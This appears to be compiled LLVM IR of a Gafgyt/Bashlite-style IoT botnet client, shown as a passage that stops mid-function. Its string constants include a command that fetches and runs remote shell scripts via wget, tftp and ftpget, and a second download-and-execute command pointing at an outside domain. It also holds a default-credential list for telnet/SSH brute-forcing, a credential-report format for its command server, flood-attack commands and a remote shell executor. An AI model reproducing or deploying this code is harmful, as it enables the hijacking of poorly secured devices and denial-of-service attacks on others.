; ModuleID = 'host/ir_O3/B1nary.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = local_unnamed_addr global i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), align 8
@.str = private unnamed_addr constant [375 x i8] c"cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00", align 1
@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [12 x i8] c"0.0.0.0:666\00", align 1
@useragents = local_unnamed_addr global [23 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.24, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.4 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.5 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.6 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.7 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.8 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.9 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.10 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.11 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.12 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.13 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.15 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.16 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.17 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.18 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.19 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.21 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.23 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.24 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@usernames = local_unnamed_addr global [4 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0)], align 16
@.str.25 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.28 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@passwords = local_unnamed_addr global [13 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0)], align 16
@.str.29 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.30 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.31 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"123\00\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.36 = private unnamed_addr constant [14 x i8] c"7ujMko0vizxv\00\00", align 1
@.str.37 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.127 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.38 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.39 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.40 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.41 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.42 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.44 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.46 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.47 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.48 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.49 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.50 = private unnamed_addr constant [8 x i8] c"0.0.0.0\00", align 1
@.str.51 = private unnamed_addr constant [14 x i8] c"GET gtop.sh\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.55 = private unnamed_addr constant [97 x i8] c"wget -q http://autoinstaller.us/NsfjSh -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"user:\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.61 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.62 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.64 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.66 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.68 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.69 = private unnamed_addr constant [7 x i8] c"denied\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.75 = private unnamed_addr constant [62 x i8] c"sh x;busybox chmod +x z | | chmod +x z;./z;rm -rf z;rm -f x\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [32 x i8] c"/bin/busybox;echo -e 'gayfgt'\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [10 x i8] c"ulti-call\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"multi-call\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.80 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.82 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.83 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.85 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.88 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.90 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.91 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.92 = private unnamed_addr constant [13 x i8] c"wget -s -U \22\00", align 1
@.str.93 = private unnamed_addr constant [6 x i8] c"\22 -q \00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.95 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.96 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.97 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.98 = private unnamed_addr constant [39 x i8] c"SCANNER SSH/TELNET ON | SSH/TELNET OFF\00", align 1
@.str.99 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.100 = private unnamed_addr constant [24 x i8] c"TELNET SCANNER STOPPED\0A\00", align 1
@.str.101 = private unnamed_addr constant [10 x i8] c"TELNET ON\00", align 1
@.str.102 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER EXECUTED\0A\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.104 = private unnamed_addr constant [22 x i8] c"SSH SCANNER EXECUTED\0A\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.109 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.110 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.111 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.112 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.113 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.114 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"DARKAI\00", align 1
@.str.116 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.117 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.119 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.120 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.121 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.122 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.123 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.124 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.125 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.126 = private unnamed_addr constant [2 x i8] c" \00", align 1
@ipState.0 = internal unnamed_addr global i8 0, align 1
@ipState.1 = internal unnamed_addr global i8 0, align 1
@ipState.2 = internal unnamed_addr global i8 0, align 1
@ipState.3 = internal unnamed_addr global i8 0, align 1
@ipState.4 = internal unnamed_addr global i8 0, align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
min.iters.checked:
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %1 = add i32 %0, -1640531527
  store i32 %1, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %2 = add i32 %0, 1013904242
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  %vector.recur.init = insertelement <2 x i32> undef, i32 %0, i32 1
  %load_initial = load <2 x i32>, <2 x i32>* bitcast (i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1) to <2 x i32>*), align 4
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %min.iters.checked
  %store_forwarded = phi <2 x i32> [ %load_initial, %min.iters.checked ], [ %16, %vector.body ]
  %index = phi i64 [ 0, %min.iters.checked ], [ %index.next.1, %vector.body ]
  %vector.recur = phi <2 x i32> [ %vector.recur.init, %min.iters.checked ], [ %8, %vector.body ]
  %vec.ind = phi <2 x i64> [ <i64 3, i64 4>, %min.iters.checked ], [ %vec.ind.next.1, %vector.body ]
  %3 = or i64 %index, 3
  %4 = shufflevector <2 x i32> %vector.recur, <2 x i32> %store_forwarded, <2 x i32> <i32 1, i32 2>
  %5 = trunc <2 x i64> %vec.ind to <2 x i32>
  %6 = xor <2 x i32> %5, <i32 -1640531527, i32 -1640531527>
  %7 = xor <2 x i32> %6, %4
  %8 = xor <2 x i32> %7, %store_forwarded
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %3
  %10 = bitcast i32* %9 to <2 x i32>*
  store <2 x i32> %8, <2 x i32>* %10, align 4
  %vec.ind.next = add <2 x i64> %vec.ind, <i64 2, i64 2>
  %11 = add nsw i64 %index, 5
  %12 = shufflevector <2 x i32> %store_forwarded, <2 x i32> %8, <2 x i32> <i32 1, i32 2>
  %13 = trunc <2 x i64> %vec.ind.next to <2 x i32>
  %14 = xor <2 x i32> %13, <i32 -1640531527, i32 -1640531527>
  %15 = xor <2 x i32> %14, %12
  %16 = xor <2 x i32> %15, %8
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %11
  %18 = bitcast i32* %17 to <2 x i32>*
  store <2 x i32> %16, <2 x i32>* %18, align 4
  %index.next.1 = add nsw i64 %index, 4
  %vec.ind.next.1 = add <2 x i64> %vec.ind, <i64 4, i64 4>
  %19 = icmp eq i64 %index.next.1, 4092
  br i1 %19, label %middle.block, label %vector.body, !llvm.loop !1

middle.block:                                     ; preds = %vector.body
  br label %._crit_edge

._crit_edge:                                      ; preds = %middle.block
  %vector.recur.extract = extractelement <2 x i32> %8, i32 1
  %20 = load i32, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4093), align 4
  %21 = xor i32 %vector.recur.extract, -1640532410
  %22 = xor i32 %21, %20
  store i32 %22, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 4095), align 4
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  store i32 %18, i32* %5, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #15
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #15
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %80
  %.0.lcssa.ph = phi i32 [ %79, %.lr.ph22 ], [ %81, %80 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %17 = sext i32 %.0.lcssa to i64
  %18 = icmp sgt i64 %17, %16
  %smax = select i1 %18, i64 %17, i64 %16
  %19 = add nsw i64 %smax, 1
  %20 = sub nsw i64 %19, %16
  %min.iters.check = icmp ult i64 %20, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %16, %vector.memcheck ], [ %16, %min.iters.checked ], [ %16, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %20, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %21 = icmp sgt i64 %17, %16
  %smax34 = select i1 %21, i64 %17, i64 %16
  %22 = add nsw i64 %smax34, 1
  %23 = sub nsw i64 %22, %16
  %scevgep = getelementptr i8, i8* %0, i64 %23
  %scevgep35 = getelementptr i8, i8* %0, i64 %16
  %scevgep36 = getelementptr i8, i8* %0, i64 %22
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
